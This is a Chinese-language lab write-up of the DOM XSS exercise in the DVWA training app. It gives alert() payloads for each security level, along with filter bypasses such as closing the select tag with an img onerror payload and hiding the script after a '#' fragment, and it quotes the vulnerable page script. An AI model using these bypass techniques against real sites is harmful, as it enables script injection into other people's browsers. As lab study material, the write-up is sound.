## XSS-dom

# low 

注入點
```
http://dvwa.com/vulnerabilities/xss_d/?default=<script>alert('xss');</script>
```


參數會經過後端，且後端無過濾。
```
GET /vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%27xss%27);%3C/script%3E HTTP/1.1
Host: dvwa.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=91nivoc1cp5m1me76b024ndev8; security=low
Upgrade-Insecure-Requests: 1


```







# medium 

後端過濾，並且修改跳轉為english
```
http://dvwa.com/vulnerabilities/xss_d/?default=<script>alert('xss');</script>


http://dvwa.com/vulnerabilities/xss_d/?default=english


123卻又可以正常輸出，所以判斷為黑名單，估計過濾掉了 <script> 
經過測試確實<script> 不行
http://dvwa.com/vulnerabilities/xss_d/?default=123

雙寫無法
<s<script>cript>alert('xss');</script>


url encode 無法
%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E

```


```
可以被插入，但是需要閉合

<img src='1' onerror=javascript:alert(xss)>


123</option></select><img src='1' onerror=javascript:alert(xss)>


```










# high



使用了白名單，基本無法繞過，但其實這整題，都是因為js 代碼抓取url 導致xss的。



繞過手法 #號
```
http://dvwa.com/vulnerabilities/xss_d/?default=English#<script>alert('xss');</script>
```


關鍵在於#號繞過後端過濾，然後前端JS會抓取參數值。
```
if (document.location.href.indexOf("default=") >= 0) {
    // 如果包含，则获取 "default=" 后面的语言代码
    var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);
    // 生成一个选项，使用获取的语言代码作为值和显示文本
    var option1 = document.createElement("option");
    option1.value = lang;
    option1.text = decodeURI(lang);
```





# impossible



前端過濾沒用。這題形成的本質在於前端會抓取url，
```
 <?php

# Don't need to do anything, protection handled on the client side

?>

```



但這題拿掉了decodeURI(lang)，所以url 的值不在decode了，所以不成功。
```

if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
    document.write("<option value='' disabled='disabled'>----</option>");
}

document.write("<option value='English'>English</option>");
document.write("<option value='French'>French</option>");
document.write("<option value='Spanish'>Spanish</option>");
document.write("<option value='German'>German</option>");




--------

if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);
    document.write("<option value='" + lang + "'>" + (lang) + "</option>");
    document.write("<option value='' disabled='disabled'>----</option>");
}

document.write("<option value='English'>English</option>");
document.write("<option value='French'>French</option>");
document.write("<option value='Spanish'>Spanish</option>");
document.write("<option value='German'>German</option>");






```